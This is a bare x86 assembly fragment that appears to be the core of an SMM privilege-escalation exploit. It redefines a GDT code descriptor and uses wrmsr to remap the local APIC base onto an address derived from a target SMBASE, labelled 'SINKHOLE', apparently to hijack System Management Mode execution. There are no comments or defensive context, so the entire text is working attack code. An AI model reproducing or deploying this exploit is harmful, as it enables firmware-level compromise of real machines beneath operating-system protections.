TARGET_SMBASE equ 0x1f5ef800
GDT_ADDRESS equ 0x10000
FJMP_REGISTER equ 0x8097
DSC_REGISTER equ 0xfb00
DESCRIPTOR_ADDRESS equ 0x10
APIC_BASE_MSR equ 0x1b
SINKHOLE equ ((TARGET_SMBASE+DSC_REGISTER)&0xfffff000)
ROP_REGISTER equ 0x1000
CS_BASE equ (ROP_REGISTER-FJMP_REGISTER)
APIC_BSP equ 0x100
APIC_ACTIVE equ 0x800
wbinvd
mov dword [dword GDT_ADDRESS+DESCRIPTOR_ADDRESS+4],
	(CS_BASE&0xff000000) | (0x00cf9a00) | 
		(CS_BASE&0x00ff0000)>>16
mov dword [dword GDT_ADDRESS+DESCRIPTOR_ADDRESS+0],
	(CS_BASE&0x0000ffff)<<16 | 0xffff
mov eax, SINKHOLE | APIC_ACTIVE | APIC_BSP
mov edx, 0
mov ecx, APIC_BASE_MSR
wrmsr
jmp $
